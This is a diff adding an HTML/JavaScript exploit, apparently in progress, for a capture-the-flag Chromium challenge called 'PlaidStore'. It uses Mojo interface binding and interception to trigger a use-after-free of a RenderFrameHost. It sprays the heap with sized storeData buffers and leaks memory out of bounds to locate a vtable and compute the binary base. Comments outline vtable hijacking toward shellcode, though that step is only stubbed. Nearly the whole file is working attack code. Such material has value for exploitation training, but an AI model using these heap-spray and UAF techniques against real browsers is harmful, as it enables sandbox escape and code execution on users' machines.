@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html>
+    <script src="/mojo_js_extracted/mojo/public/js/mojo_bindings.js"></script>
+    <script src="/mojo_js_extracted/third_party/blink/public/mojom/plaidstore/plaidstore.mojom.js"></script>
+
+    <!-- 1. we can read arbitraty length from our 'data_store_' (std::vector<uint8_t>) -->
+    <!-- 2. uaf due to 'MakeSelfOwnedReciever' - we can still queue messages on the pipe, we can intercept the request using 
+            MojoJSTest and free it immediately -->
+    <head>
+        <script>
+            console.log('asdf');
+        </script>
+
+        <script>
+            /*
+            rdi = RenderFrameHost
+            [rdi] = vtable
+            [rdi + 8] = render frame host
+
+            [rax + 160] = IsRenderFrameAlive()
+            */
+
+
+
+            const kSprayAmount = 500;
+            const kRenderFrameHostImplSize = 0xc28;
+        </script>
+
+        <script>
+			function print(str) {
+				console.log(str);
+
+                const element = document.getElementById('logger');
+                if (element) {
+                    element.innerText += str + '\n';
+                }
+            }
+            function create_rfh() {
+                const iframe = document.createElement('iframe');
+                iframe.src = document.location.href + '#qwerty';
+                iframe.id = 'qwerty';
+
+                document.body.appendChild(iframe);
+            }
+
+            function delete_rfh() {
+                print('deleting rfh');
+                document.getElementById('qwerty').remove();
+            }
+
+            const interfaceName = 'yuvaly0';
+
+            function im_an_iframe() {
+                const pipe = Mojo.createMessagePipe();
+                Mojo.bindInterface(blink.mojom.PlaidStore.name, pipe.handle1, "context", true);
+                Mojo.bindInterface(interfaceName, pipe.handle0, "process");
+            }
+
+            function spray(buffer) {
+                const plaid_store_ptr = new blink.mojom.PlaidStorePtr();
+                    Mojo.bindInterface(blink.mojom.PlaidStore.name, 
+                mojo.makeRequest(plaid_store_ptr).handle, 'context', true);
+
+                /*
+                    when we call storeData on a plaidStore object it will create an equal size vector, meaning we have arbitrary allocation size, we can use it for spraying
+                */
+                for(let i = 0; i < kSprayAmount; i++) {
+                    plaid_store_ptr.storeData(`yuvaly${i}`, buffer);
+                }
+            }
+
+            function replace_free_object(buffer) {
+                const frame = create_rfh();
+                const dema_data = new Uint8Array(3).fill(0x23);
+                const interceptor = new MojoInterfaceInterceptor(interfaceName, "process");
+
+                interceptor.oninterfacerequest = (e) => {
+                    print('intercepted');
+                    interceptor.stop();
+
+                    const provider = new blink.mojom.PlaidStorePtr(e.handle);
+
+                    delete_rfh();
+
+                    spray(buffer);
+
+                    setTimeout(() => {
+                        print('[+] gonna trigger');
+                        provider.storeData('1', dema_data);
+                    }, 500);
+                }
+
+                interceptor.start(); 
+            }
+        </script>
+
+        <script>
+            /*
+                we know the relative vtable before loading the binary to the memory
+                is at 0x9fb67a0 - because the render is at the page level we know
+                that even when we'll load it it will end with '7a0',
+                now we can search for an address in the leak that starts with 
+                0x00005 and ends with '7a0' and subtract the diff we know (the vtable relative offest) in order to calculate the binary base
+            */
+            async function get_base(object, key, amount) {
+                const get_address = (buffer) => {
+                    const addr = '0x' + buffer.map(x => x.toString(16).padStart(2, '0')).reverse().join('');
+                    return addr;
+                };
+
+                is_important = false;
+
+                for(let i = 8; i < amount * 8; i += 8) {
+                    const leak = object.getData(key, i)
+                        .then(async (data) => {
+                            const leaked_data = data.data.slice(i - 8, i);
+                            const leaked_address = get_address(leaked_data);
+                       		
+                       		const container = document.createElement('span');
+                            const element = document.createTextNode(leaked_address);
+                            const newLine = document.createElement('br');
+
+                            container.appendChild(element);
+                            container.appendChild(newLine);
+                           
+                       		if (leaked_address.startsWith('0x00005') && 
+                                leaked_address.endsWith('7a0')) {
+                       			container.style.color = 'red';
+                            }
+
+                            document.body.appendChild(container);
+                        });
+                }
+
+                return null;
+            }
+
+            async function get_leak() {
+            	const buffer = new ArrayBuffer(40);
+                const data = new Uint8Array(buffer);
+                data.fill(0x41);
+
+                const plaid_store_objects = [];
+
+                for(let i = 0; i < 100; i++) {
+                    const plaid_store_ptr = new blink.mojom.PlaidStorePtr();
+                        Mojo.bindInterface(blink.mojom.PlaidStore.name, 
+                    mojo.makeRequest(plaid_store_ptr).handle, 'context', true);
+
+                    plaid_store_ptr.storeData(`yuvaly${i}`, data);
+                    plaid_store_objects[i] = plaid_store_ptr;
+                }
+
+
+                /*
+                    scan the address space and hope we find PlaidStoreImpl vtable
+                */
+
+                const result = await get_base(plaid_store_objects[0], 'yuvaly0', 1000);
+
+                print('done');
+            }
+
+            function get_shellcode(binary_base, leak) {
+                // as the size of 'RenderFrameHostImpl'
+
+                /*
+                    currently the contents of 'array' will be the [rdi] contents, 
+                    meaning the address of the object vtable, now we need to get a leak of some other address
+                    that we control it's content, e.g backing store of array buffer, and the we can set vtable+160
+                    to it and it's value to the shellcode :)
+                */
+                const array_buffer = new ArrayBuffer(kRenderFrameHostImplSize);
+                const array = new BigUint64Array(array_buffer);
+                array.fill(0x4141414141414141);
+
+                return array;
+            }
+
+            async function exploit() {
+				get_leak()		
+            }
+        </script>
+    </head>
+    <body onload="exploit()">
+    	<span id="logger"></span>
+    </body>
+</html>
